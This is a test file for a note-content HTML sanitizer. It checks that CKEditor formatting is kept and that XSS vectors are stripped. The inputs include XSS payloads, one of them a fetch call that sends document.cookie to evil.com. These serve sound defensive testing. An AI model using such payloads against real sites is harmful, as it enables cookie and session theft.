import { describe, expect, it } from "vitest";
import { sanitizeNoteContentHtml } from "./sanitize_content";

describe("sanitizeNoteContentHtml", () => {
    // --- Preserves legitimate CKEditor content ---

    it("preserves basic rich text formatting", () => {
        const html = '<p><strong>Bold</strong> and <em>italic</em> text</p>';
        expect(sanitizeNoteContentHtml(html)).toBe(html);
    });

    it("preserves headings", () => {
        const html = '<h1>Title</h1><h2>Subtitle</h2><h3>Section</h3>';
        expect(sanitizeNoteContentHtml(html)).toBe(html);
    });

    it("preserves links with href", () => {
        const html = '<a href="https://example.com">Link</a>';
        expect(sanitizeNoteContentHtml(html)).toBe(html);
    });

    it("preserves internal note links with data attributes", () => {
        const html = '<a class="reference-link" href="#root/abc123" data-note-path="root/abc123">My Note</a>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).toContain('class="reference-link"');
        expect(result).toContain('href="#root/abc123"');
        expect(result).toContain('data-note-path="root/abc123"');
        expect(result).toContain(">My Note</a>");
    });

    it("preserves images with src", () => {
        const html = '<img src="api/images/abc123/image.png" alt="test">';
        expect(sanitizeNoteContentHtml(html)).toContain('src="api/images/abc123/image.png"');
    });

    it("preserves tables", () => {
        const html = '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>';
        expect(sanitizeNoteContentHtml(html)).toBe(html);
    });

    it("preserves code blocks", () => {
        const html = '<pre><code class="language-javascript">const x = 1;</code></pre>';
        expect(sanitizeNoteContentHtml(html)).toBe(html);
    });

    it("preserves include-note sections with data-note-id", () => {
        const html = '<section class="include-note" data-note-id="abc123">&nbsp;</section>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).toContain('class="include-note"');
        expect(result).toContain('data-note-id="abc123"');
        expect(result).toContain("&nbsp;</section>");
    });

    it("preserves figure and figcaption", () => {
        const html = '<figure><img src="test.png"><figcaption>Caption</figcaption></figure>';
        expect(sanitizeNoteContentHtml(html)).toContain("<figure>");
        expect(sanitizeNoteContentHtml(html)).toContain("<figcaption>");
    });

    it("preserves task list checkboxes", () => {
        const html = '<ul><li><input type="checkbox" checked disabled>Task done</li></ul>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).toContain('type="checkbox"');
        expect(result).toContain("checked");
    });

    it("preserves inline styles for colors", () => {
        const html = '<span style="color: red;">Red text</span>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).toContain("style");
        expect(result).toContain("color");
    });

    it("preserves data-* attributes", () => {
        const html = '<div data-custom-attr="value" data-note-id="abc">Content</div>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).toContain('data-custom-attr="value"');
        expect(result).toContain('data-note-id="abc"');
    });

    // --- Blocks XSS vectors ---

    it("strips script tags", () => {
        const html = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<script");
        expect(result).not.toContain("alert");
        expect(result).toContain("<p>Hello</p>");
        expect(result).toContain("<p>World</p>");
    });

    it("strips onerror event handlers on images", () => {
        const html = '<img src="x" onerror="alert(1)">';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("onerror");
        expect(result).not.toContain("alert");
    });

    it("strips onclick event handlers", () => {
        const html = '<div onclick="alert(1)">Click me</div>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("onclick");
        expect(result).not.toContain("alert");
    });

    it("strips onload event handlers", () => {
        const html = '<img src="x" onload="alert(1)">';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("onload");
        expect(result).not.toContain("alert");
    });

    it("strips onmouseover event handlers", () => {
        const html = '<span onmouseover="alert(1)">Hover</span>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("onmouseover");
        expect(result).not.toContain("alert");
    });

    it("strips onfocus event handlers", () => {
        const html = '<input onfocus="alert(1)" autofocus>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("onfocus");
        expect(result).not.toContain("alert");
    });

    it("strips javascript: URIs in href", () => {
        const html = '<a href="javascript:alert(1)">Click</a>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("javascript:");
    });

    it("strips javascript: URIs in img src", () => {
        const html = '<img src="javascript:alert(1)">';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("javascript:");
    });

    it("strips iframe tags", () => {
        const html = '<iframe src="https://evil.com"></iframe>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<iframe");
    });

    it("strips object tags", () => {
        const html = '<object data="evil.swf"></object>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<object");
    });

    it("strips embed tags", () => {
        const html = '<embed src="evil.swf">';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<embed");
    });

    it("strips style tags", () => {
        const html = '<style>body { background: url("javascript:alert(1)") }</style><p>Text</p>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<style");
        expect(result).toContain("<p>Text</p>");
    });

    it("strips SVG with embedded script", () => {
        const html = '<svg><script>alert(1)</script></svg>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<script");
        expect(result).not.toContain("alert");
    });

    it("strips meta tags", () => {
        const html = '<meta http-equiv="refresh" content="0;url=evil.com"><p>Text</p>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<meta");
    });

    it("strips base tags", () => {
        const html = '<base href="https://evil.com/"><p>Text</p>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<base");
    });

    it("strips link tags", () => {
        const html = '<link rel="stylesheet" href="evil.css"><p>Text</p>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<link");
    });

    // --- Edge cases ---

    it("handles empty string", () => {
        expect(sanitizeNoteContentHtml("")).toBe("");
    });

    it("handles null-like falsy values", () => {
        expect(sanitizeNoteContentHtml(null as unknown as string)).toBe(null);
        expect(sanitizeNoteContentHtml(undefined as unknown as string)).toBe(undefined);
    });

    it("handles nested XSS attempts", () => {
        const html = '<div><p>Safe</p><img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)"><p>Also safe</p></div>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("onerror");
        expect(result).not.toContain("fetch");
        expect(result).not.toContain("cookie");
        expect(result).toContain("Safe");
        expect(result).toContain("Also safe");
    });

    it("handles case-varied event handlers", () => {
        const html = '<img src="x" ONERROR="alert(1)">';
        const result = sanitizeNoteContentHtml(html);
        expect(result.toLowerCase()).not.toContain("onerror");
    });

    it("strips dangerous data: URI on anchor elements", () => {
        const html = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
        const result = sanitizeNoteContentHtml(html);
        // DOMPurify should either strip the href or remove the dangerous content
        expect(result).not.toContain("<script");
        expect(result).not.toContain("alert(1)");
    });

    it("allows data: URI on image elements", () => {
        const html = '<img src="data:image/png;base64,iVBOR...">';
        const result = sanitizeNoteContentHtml(html);
        expect(result).toContain("data:image/png");
    });

    it("strips template tags which could contain scripts", () => {
        const html = '<template><script>alert(1)</script></template>';
        const result = sanitizeNoteContentHtml(html);
        expect(result).not.toContain("<script");
        expect(result).not.toContain("<template");
    });
});
